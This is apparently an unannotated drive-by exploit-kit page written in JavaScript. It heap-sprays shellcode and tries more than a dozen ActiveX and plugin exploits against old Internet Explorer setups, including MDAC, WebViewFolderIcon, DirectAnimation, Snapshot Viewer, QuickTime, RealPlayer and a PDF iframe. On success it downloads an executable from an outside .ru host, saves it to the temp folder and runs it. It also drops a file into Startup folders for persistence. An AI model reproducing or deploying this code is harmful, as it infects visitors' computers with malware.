
			var url="http://dk.an-dk.ru/partners/admin/ex/7/load.php?id=96720";
			var m=new Array();
			var mf=0;
			function hex(num,width){
				var digits="0123456789ABCDEF";
				var hex=digits.substr(num&0xF,1);
				while(num>0xF){
					num=num>>>4;
					hex=digits.substr(num&0xF,1)+hex;
				}
				var width=(width?width:0);
				while(hex.length<width)hex="0"+hex;
				return hex;
			}
			function addr(addr){
				return unescape("%u"+hex(addr&0xFFFF,4)+"%u"+hex((addr>>16)&0xFFFF,4));
			}
			function unes(str){
				var tmp="";
				for(var i=0;i<str.length;i+=4){
					tmp+=addr((str.charCodeAt(i+3)<<24)+
					(str.charCodeAt(i+2)<<16)+
					(str.charCodeAt(i+1)<<8)+
					str.charCodeAt(i));
				}
				return unescape(tmp);
			}
			function hav(){
				m=m;
				setTimeout("hav()",1000);
			}
			function gss(ss,sss){
				while(ss.length*2<sss)ss+=ss;
				ss=ss.substring(0,sss/2);
				return ss;
			}
			function ms(){
				var plc=unescape("%u4343%u4343%u4343%u0FEB%u335B%u66C9%u80B9%u8001%uEF33%uE243%uEBFA%uE805%uFFEC%uFFFF%u8B7F%uDF4E%uEFEF%u64EF%uE3AF%u9F64%u42F3%u9F64%u6EE7%uEF03%uEFEB%u64EF%uB903%u6187%uE1A1%u0703%uEF11%uEFEF%uAA66%uB9EB%u7787%u6511%u07E1%uEF1F%uEFEF%uAA66%uB9E7%uCA87%u105F%u072D%uEF0D%uEFEF%uAA66%uB9E3%u0087%u0F21%u078F%uEF3B%uEFEF%uAA66%uB9FF%u2E87%u0A96%u0757%uEF29%uEFEF%uAA66%uAFFB%uD76F%u9A2C%u6615%uF7AA%uE806%uEFEE%uB1EF%u9A66%u64CB%uEBAA%uEE85%u64B6%uF7BA%u07B9%uEF64%uEFEF%u87BF%uF5D9%u9FC0%u7807%uEFEF%u66EF%uF3AA%u2A64%u2F6C%u66BF%uCFAA%u1087%uEFEF%uBFEF%uAA64%u85FB%uB6ED%uBA64%u07F7%uEF8E%uEFEF%uAAEC%u28CF%uB3EF%uC191%u288A%uEBAF%u8A97%uEFEF%u9A10%u64CF%uE3AA%uEE85%u64B6%uF7BA%uAF07%uEFEF%u85EF%uB7E8%uAAEC%uDCCB%uBC34%u10BC%uCF9A%uBCBF%uAA64%u85F3%uB6EA%uBA64%u07F7%uEFCC%uEFEF%uEF85%u9A10%u64CF%uE7AA%uED85%u64B6%uF7BA%uFF07%uEFEF%u85EF%u6410%uFFAA%uEE85%u64B6%uF7BA%uEF07%uEFEF%uAEEF%uBDB4%u0EEC%u0EEC%u0EEC%u0EEC%u036C%uB5EB%u64BC%u0D35%uBD18%u0F10%u64BA%u6403%uE792%uB264%uB9E3%u9C64%u64D3%uF19B%uEC97%uB91C%u9964%uECCF%uDC1C%uA626%u42AE%u2CEC%uDCB9%uE019%uFF51%u1DD5%uE79B%u212E%uECE2%uAF1D%u1E04%u11D4%u9AB1%uB50A%u0464%uB564%uECCB%u8932%uE364%u64A4%uF3B5%u32EC%uEB64%uEC64%uB12A%u2DB2%uEFE7%u1B07%u1011%uBA10%uA3BD%uA0A2%uEFA1%u7468%u7074%u2F3A%u642F%u2E6B%u6E61%u642D%u2E6B%u7572%u702F%u7261%u6E74%u7265%u2F73%u6461%u696D%u2F6E%u7865%u372F%u6C2F%u616F%u2E64%u6870%u3F70%u6469%u393D%u3736%u3032%u7326%u6C70%u353D");
				CollectGarbage();
				if (mf)return(0);
				mf=1;
				var hsta=0x0c0c0c0c,hbs=0x100000,pl=plc.length*2,sss=hbs-(pl+0x38);
				var ss=gss(addr(hsta),sss),hb=(hsta-hbs)/hbs;
				for(i=0;i<hb;i++)m[i]=ss+plc;
				hav();
				return(1);
			}
			function cobj(obj){
				var ret=null;
				if(obj.substring(0,1)=="{"){
					try{
						var clsid=obj.substring(1,obj.length-1);
						ret=document.createElement("object");
						ret.setAttribute("classid","clsid:"+clsid);
						return ret;
					}catch(e){
						return null;
					}
				}else{
					try{
						ret=new ActiveXObject(obj);
						return ret;
					}catch(e){
						return null;
					}
				}
			}
			var padding = "AAAA";
			var heapBase = 0x00150000;
			var memo;
			function init(maxAlloc){
				while (4 + padding.length*2 + 2 < 65535)padding += padding;
				memo = new Array();
				flush();
			}
			function flush(){
				delete memo["plunger"];
				CollectGarbage();
				memo["plunger"] = new Array();
				var bytes = new Array(32, 64, 256, 32768);
				for (var i = 0; i < 6; i++) {
					for(var n = 0; n < 4; n++) {
						var len = memo["plunger"].length;
						eval("memo[\"plunger\"][len] = padding.substr(0, (" + bytes[n] + "-6)/2);");
					}
				}
			}
			function alloc(arg, tag){
				var size;
				size = arg;
				if (size == 32 || size == 64 || size == 256 || size == 32768) {}
				if ( ! memo[tag] )memo[tag] = new Array();
				var len = memo[tag].length;
				memo[tag][len] = padding.substr(0, (arg-6)/2);
			}
			function alloc_str(arg, tag){
				var size;
				size = 4 + arg.length*2 + 2;
				if (size == 32 || size == 64 || size == 256 || size == 32768) {}
				if ( ! memo[tag])memo[tag] = new Array();
				var len = memo[tag].length;
				memo[tag][len] = arg.substr(0, arg.length);
			}
			function free(tag) { 
				delete memo[tag];
				CollectGarbage();
				flush();
			}
			function CreateO(o,n){
				var r=null;
				try{r=o.CreateObject(n)}catch(e){}
				if(!r){try{r=o.CreateObject(n,"")}catch(e){}}
				if(!r){try{r=o.CreateObject(n,"","")}catch(e){}}
				if(!r){try{r=o.GetObject("",n)}catch(e){}}
				if(!r){try{r=o.GetObject(n,"")}catch(e){}}
				if(!r){try{r=o.GetObject(n)}catch(e){}}
				return(r);
			}
			function Go(a){
				var eurl=url+"&spl=1";
				var fname="winDBRyVhJ.exe";
				var fso=CreateO(a,"Scripting.FileSystemObject")
				var sap=CreateO(a,"Shell.Application");
				var x=CreateO(a,"ADODB.Stream");
				var nl=null;
				fname=fso.BuildPath(fso.GetSpecialFolder(2),fname);
				x.Mode=3;
				try{nl=CreateO(a,"Micr"+"osoft.XMLH"+"TTP");nl.open("GET",eurl,false);}
				catch(e){try{nl=CreateO(a,"MSXML2.XMLHTTP");nl.open("GET",eurl,false);}
				catch(e){try{nl=CreateO(a,"MSXML2.ServerXMLHTTP");nl.open("GET",eurl,false);}
				catch(e){try{nl=new XMLHttpRequest();nl.open("GET",eurl,false);}
				catch(e){return 0;}}}}
				x.Type=1;
				nl.send(null);
				rb=nl.responseBody;
				x.Open();
				x.Write(rb);
				x.SaveTofile(fname,2);
				sap.ShellExecute(fname);
				return 1;
			}
			function mdac() {
				var i=0;
				var target=new Array(
				"BD96C556-65A3-11D0-983A-00C04FC29E36",
				"BD96C556-65A3-11D0-983A-00C04FC29E30",
				"AB9BCEDD-EC7E-47E1-9322-D4A210617116",
				"0006F033-0000-0000-C000-000000000046",
				"0006F03A-0000-0000-C000-000000000046",
				"6e32070a-766d-4ee6-879c-dc1fa91d2fc3",
				"6414512B-B978-451D-A0D8-FCFDF33E833C",
				"7F5B7F63-F06F-4331-8A26-339E03C0AE3D",
				"06723E09-F4C2-43c8-8358-09FCD1DB0766",
				"639F725F-1B2D-4831-A9FD-874847682010",
				"BA018599-1DB3-44f9-83B4-461454C84BF8",
				"D0C07D56-7C69-43F1-B4A0-25F5A11FAB19",
				"E8CCCDDF-CA28-496b-B050-6C07C962476B",null);
				while(target[i]){
					var a=null;
					a=document.createElement("object");
					a.setAttribute("classid","clsid:"+target[i]);
					if(a){try{var b=CreateO(a,"Shell.Application");if(b){Go(a);}}catch(e){}}
					i++;
				}
				return 0;
			}
			function wfi() {
				try{
					obj=cobj("WebViewFolderIcon.WebViewFolderIcon.1");
					if(obj){
						ms();
						for(var i=0;i<128;i++){
							var wvfio=new ActiveXObject("WebViewFolderIcon.WebViewFolderIcon.1");
							try{wvfio.setSlice(0x7ffffffe,0,0,202116108);}catch(e){}
							var wvfit=new ActiveXObject("WebViewFolderIcon.WebViewFolderIcon.1");
						}
					}
				}catch(e){}
				return 0;
			}
			function com() {
				try{
					obj=cobj("{EC444CB6-3E7E-4865-B1C3-0DE72EF39B3F}");
					if(obj){
						ms();
						z=Math.ceil(0x0c0c0c0c);
						z=document.scripts[0].createControlRange().length;
					}
				}catch(e){}
				return 0;
			}
			function dani() {
				try{
					obj=cobj("DirectAnimation.PathControl");
					if(obj){
						ms();
						init();
						var jmpecx = 0x0c0c0c0c;
						var vtable = addr(0x7ceb9090);
						for (var i = 0; i < 124/4; i++)vtable += addr(jmpecx);
						vtable += padding.substr(0, (1008-138)/2);
						var fakeObjPtr = heapBase + 0x688 + ((1008+8)/8)*48;
						var fakeObjChunk = padding.substr(0, (0x200c-4)/2) + addr(fakeObjPtr) + padding.substr(0, 14/2);
						CollectGarbage();
						flush();
						for (var i = 0; i < 100; i++)alloc_str(vtable);
						alloc_str(vtable, "lookaside");
						free("lookaside");
						for (var i = 0; i < 100; i++)alloc(0x2010);
						for (var i = 0; i < 2; i++) {
							alloc_str(fakeObjChunk);
							alloc_str(fakeObjChunk, "freeList");
						}
						alloc_str(fakeObjChunk);
						free("freeList");
						obj.KeyFrame(0x40000801, new Array(1), new Array(1));
					}
				}catch(e){}
				return 0;
			}
			function office(){
				var dir=new Array(
				"C:\Documents and Settings\All Users\Start Menu\Programs\StartUp\office.exe",
				"C:\Documents and Settings\All Users\Menu Iniciar\Programas\Iniciar\office.exe",
				"C:\Documents and Settings\All Users\Menu Inicio\Programas\Inicio\office.exe",
				"C:\Documents and Settings\All Users\Kuynnistu-valikko\Ohjelmat\Kuynnistys\office.exe",
				"C:\Documents and Settings\All Users\Menu Dumarrer\Programmes\Dumarrage\office.exe",
				"C:\Documents and Settings\All Users\Menuen Start\Programmer\Start\office.exe",
				"C:\Documents and Settings\All Users\Menu Start\Programma's\Opstarten\office.exe",
				"C:\Documents and Settings\All Users\Start Menu\Programlar\BASLANGI\office.exe",
				"C:\Documents and Settings\All Users\Menu Start\Programy\Autostart\office.exe",
				"C:\Documents and Settings\All Users\Start-meny\Programmer\Oppstart\office.exe",
				"C:\Documents and Settings\All Users\Start-menyn\Program\Autostart\office.exe",
				"C:\Documents and Settings\All Users\Menu Avvio\Programmi\Esecuzione automatica\office.exe",
				"C:\Dokumente und Einstellungen\All Users\Startmenu\Programme\Autostart\office.exe");
				var obj=null;
				obj=cobj("snpvw.Snapshot Viewer Control.1");
				if (obj){
					for(j=0;j<dir.length;j++){
						try{
							obj.Zoom = 0;
							obj.ShowNavigationButtons = false;
							obj.AllowContextMenu = false;
							obj.SnapshotPath = url+"&opr=1";
							obj.CompressedPath = dir[j];
							obj.PrintSnapshot();
						}catch(e){}
					}
				}
				return 0;
			}
			function dl(){
				try{
					var obj=null;
					obj=cobj("Downloader.DLoader.1");
					if (obj){
						obj.DownloadAndInstall(url);
					}
				}catch(e){}
				return 0;
			}
			function wks(){
				try{
					var obj=null;
					obj=cobj("{00E1DB59-6EFD-4CE7-8C0A-2DA3BCAAD9C6}");
					if(obj){
						ms();
						var num = 202116108;
						obj.WksPictureInterface = num;
					}
				}catch(e){}
				return 0;
			}
			function ogame(){
				try{
					var obj=null;
					obj=cobj("{F917534D-535B-416B-8E8F-0C04756C31A8}");
					if(obj){
						ms();
						var buf = "";
						while (buf.length < 600) buf += "\x0c\x0c\x0c\x0c";
						obj.IEStartNative(buf);
					}
				}catch(e){}
				return 0;
			}
			function ca(){
				try{
					var obj=null;
					obj=cobj("{BF6EFFF3-4558-4C4C-ADAF-A87891C5F3A3}");
					if (obj.AddColumn) {
						ms();
						var buf = addr(0x0c0c0c0c);
						while(buf.length < 128)buf += buf;
						buf = buf.substring(0, 128);
						obj.AddColumn(buf,1);
					}
				}catch(e){}
				return 0;
			}
			function buddy(){
				try {
					var obj=null;
					obj = cobj("Sb.SuperBuddy");
					if (obj) {
						ms();
						obj.LinkSBIcons(0x0c0c0c0c);
					}
				} catch(e){}
				return 0;
			}
			function gomweb(){
				try {
					var obj=null;
					obj = cobj("GomWebCtrl.GomManager.1");
					if (obj) {
						ms();
						var buf="AAAA";
						while (buf.length < 506) buf += buf;
						buf = buf.substring(0,506);
						buf += addr(0x0c0c0c0c);
						obj.OpenURL(buf);
					}
				} catch(e){}
				return 0;
			}
			function xmlcore(){
				try {
					var xml = null;
					var xml = cobj("Msxml2.XMLHTTP.6.0");
					if (xml){
						xml = cobj("Msxml2.XMLHTTP.4.0");
					}
					if(!xml)return 0;
					var obj=null;
					obj = cobj("{88d969c5-f192-11d4-a65f-0040963251e5}");
					obj = obj.object
					if(obj) {
						ms();
						try {obj.open(new Array(),new Array(),new Array(),new Array(),new Array());} catch(e) {};
						obj.open(new Object(),new Object(),new Object(),new Object(),new Object());
						obj.setRequestHeader(new Object(),"...");
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
					}
				} catch(e){}
				return 0;
			}
			function quick(){
				try {
					var obj=null;
					obj = cobj("QuickTime.QuickTime.4");
					if (obj) {
						ms();
						var buf = "";
						for(var i=0;i<200;i++) {
							buf += "AAAA";
						}
						buf += "AAA";
						for(var i=0;i<3;i++)buf += "\x0c\x0c\x0c\x0c";
						var my_div = document.createElement("div");
						my_div.innerHTML = 
						"<object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" width=\"200\" height=\"200\">" +
						"<param name=\"src\" value=\"object_rtsp\">" +
						"<param name=\"type\" value=\"image/x-quicktime\">" +
						"<param name=\"autoplay\" value=\"true\">" +
						"<param name=\"qtnext1\" value=\"<rtsp://BBBB:"+buf+">T<myself>\">" +
						"<param name=\"target\" value=\"myself\">" +
						"</object>";
						document.body.appendChild(my_div);

					}
				} catch(e) {}
				return 0;
			}
			function real(){
				try {
					var obj=null;
					obj = cobj("IERPCtl.IERPCtl.1");
					if (obj) {
						if(obj.PlayerProperty("PRODUCTVERSION")>"6.0.14.552") {
							obj = cobj("{2F542A2E-EDC9-4BF7-8CB1-87C9919F7F93}");
							ms();
							var m = "";
							var buf = addr(0x0c0c0c0c);
							while (buf.length < 32)	buf += buf;
							buf = buf.substring(0,32);
							m = obj.Console;
							obj.Console = buf;
							obj.Console = m;
							m = obj.Console;
							obj.Console = buf;
							obj.Console = m;
						}
					}
				} catch(e){}
				return 0;
			}
			function ntaudio(){
				try{
					var obj=null;
					obj=cobj("{77829F14-D911-40FF-A2F0-D11DB8D6D0BC}");
					if(obj){
						ms();
						var buf = addr(0x0c0c0c0c);
						while (buf.length < 5200) buf += buf;
						buf = buf.substring(0,5200);
						obj.SetFormatLikeSample(buf);
					}
				}catch(e){}
				return 0;
			}
			function creative(){
				try{
					var obj=null;
					obj=cobj("{0A5FD7C5-A45C-49FC-ADB5-9952547D5715}");
					if(obj){
						ms();
						var buf = addr(0x09090909);
						while (buf.length < 512) buf += buf;
						buf = buf.substring(0,512);
						obj.cachefolder = buf;
					}
				}catch(e){}
				return 0;
			}

			function pdf(){
				try {
					var vers = new Array(0,0,0);
					var ver = "0";
					var obj = null;
					obj = cobj("AcroPDF.PDF");
					if (!obj){
						obj = cobj("PDF.PdfCtrl");
					}
				
					if (obj) {
						var my_div = document.createElement("div");
						my_div.innerHTML = "<iframe src=\"http://dk.an-dk.ru/partners/admin/ex/7/pdf.php?id=96720\" width=100 height=100 style=\"display:none\"></iframe>";
						document.body.appendChild(my_div);
					}
				} catch(e){}
				return 0;
			}

			if (
				mdac() ||
				office() ||
				dl() ||
				pdf() ||
				wfi() ||
				com() ||
				creative() ||
				wks() ||
				ogame() ||
				ca() ||
				buddy() ||
				gomweb() ||
				xmlcore() ||
				quick() ||
				real() ||
				ntaudio()
				 || dani()
				) {}
			